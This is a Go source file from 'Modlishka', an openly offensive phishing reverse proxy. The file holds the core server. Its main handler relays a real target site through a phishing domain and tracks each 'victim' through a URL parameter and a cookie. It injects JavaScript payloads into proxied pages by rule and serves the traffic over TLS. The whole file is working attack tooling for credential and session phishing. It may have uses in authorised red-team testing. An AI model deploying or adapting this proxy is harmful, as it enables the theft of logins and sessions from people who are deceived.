/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/plugin"
	"net"
	"net/http"
	"strings"
)

var ServerRuntimeConfig *ServerConfig

type ServerConfig struct {
	config.Options
	Handler *http.ServeMux
}

type EmbeddedServer struct {
	http.Server
	WebServerCertificate     string
	WebServerKey             string
	WebServerCertificatePool string
}

func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {

	// Patch the FQDN

	target := TranslateRequestHost(*conf.Target, r.Host)
	targetDomain := strings.Replace(target, "https://", "", -1)
	targetDomain = strings.Replace(targetDomain, "http://", "", -1)

	if !*conf.DisableSecurity && IsValidRequestHost(r.Host, PhishingDomain) == false {
		log.Infof("Redirecting client to %s", TopLevelDomain)
		Redirect(w, r, "")
		return
	}
	if !*conf.DisableSecurity && len(targetDomain) > 0 && IsRejectedDomain(targetDomain) == true {
		log.Infof("Redirecting client to %s", TopLevelDomain)
		Redirect(w, r, "")
		return
	}

	// Check if the session should be terminated
	if _, err := r.Cookie(TERMINATE_SESSION_COOKIE_NAME); err == nil {
		if len(*conf.TerminateRedirectUrl) > 0 {
			log.Infof("Session terminated; Redirecting client to %s", *conf.TerminateRedirectUrl)
			Redirect(w, r, *conf.TerminateRedirectUrl)
		} else {
			log.Infof("Session terminated; Redirecting client to %s", TopLevelDomain)
			Redirect(w, r, "")
		}
		return
	}

	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
	queryString := r.URL.Query()
	if _, ok := queryString[TrackingParam]; ok {
		if _, err := r.Cookie(TrackingCookie); err == nil {
			delete(queryString, TrackingParam)
			r.URL.RawQuery = queryString.Encode()
			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
			Redirect(w, r, r.URL.String())
		}
	}

	log.Debugf("[P] Proxying target [%s] via phishing [%s]", target, PhishingDomain)

	origin := r.Header.Get("Origin")
	settings := &Settings{
		conf.Options,
		target,
		r.Host,
		origin,
	}

	reverseProxy := settings.NewReverseProxy()

	if CheckTermination(r.Host + r.URL.String()) {
		log.Infof("[P] Time to terminate this victim! Termination URL matched: %s", r.Host+r.URL.String())
		reverseProxy.Terminate = true
	}

	if reverseProxy.Origin != "" {
		log.Debugf("[P] ReverseProxy Origin: [%s]", reverseProxy.Origin)
	}

	//set up user tracking variables
	if val, ok := queryString[TrackingParam]; ok {
		reverseProxy.InitPhishUser = val[0]
		reverseProxy.PhishUser = val[0]
		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
	}

	//check if JS Payload should be injected
	if payload := GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
		reverseProxy.Payload = payload
	}

	if cookie, err := r.Cookie(TrackingCookie); err == nil {
		reverseProxy.PhishUser = cookie.Value
	}

	reverseProxy.Proxy.ServeHTTP(w, r)
}

func (es *EmbeddedServer) ListenAndServeTLS(addr string) error {

	c := &tls.Config{
		MinVersion: tls.VersionTLS10,
	}
	if es.TLSConfig != nil {
		*c = *es.TLSConfig
	}
	if c.NextProtos == nil {
		c.NextProtos = []string{"http/1.1"}
	}

	var err error
	c.Certificates = make([]tls.Certificate, 1)
	c.Certificates[0], err = tls.X509KeyPair([]byte(es.WebServerCertificate), []byte(es.WebServerKey))

	if es.WebServerCertificatePool != "" {
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(es.WebServerCertificatePool)) {
			err := errors.New("ListenAndServeTLS: can't parse client certificate authority")
			log.Fatalf(err.Error() + " . Terminating.")
		}
		c.ClientCAs = certpool
	}

	c.PreferServerCipherSuites = true
	if err != nil {
		return err
	}

	conn, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(conn, c)
	return es.Serve(tlsListener)
}

func SetServerRuntimeConfig(conf config.Options) {

	ServerRuntimeConfig = &ServerConfig{
		Options: conf,
		Handler: http.NewServeMux(),
	}

}

func RunServer() {

	ServerRuntimeConfig.Handler.HandleFunc("/", ServerRuntimeConfig.MainHandler)
	plugin.RegisterHandler(ServerRuntimeConfig.Handler)

	var listener = string(*ServerRuntimeConfig.ListeningAddress) + ":" + string(*ServerRuntimeConfig.ListeningPort)

	log.Infof(`

>>>> "Modlishka" Piotr Duszynski @drk1wi - Reverse Proxy started <<<<
%s

Listening on: [%s] 
Proxying [%s:%s] via --> [%s] `, Banner, listener, PhishingDomain, *ServerRuntimeConfig.ListeningPort, *ServerRuntimeConfig.Target)

	if *ServerRuntimeConfig.UseTls == true {

		embeddedTLSServer := &EmbeddedServer{
			WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
			WebServerKey:             *ServerRuntimeConfig.TLSKey,
			WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
		}

		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler

		err := embeddedTLSServer.ListenAndServeTLS(listener)
		if err != nil {
			log.Fatalf(err.Error() + " . Terminating.")
		}

	} else {

		server := &http.Server{Addr: listener, Handler: ServerRuntimeConfig.Handler}

		if err := server.ListenAndServe(); err != nil {
			log.Fatalf("%s . Terminating.", err)
		}
	}

}
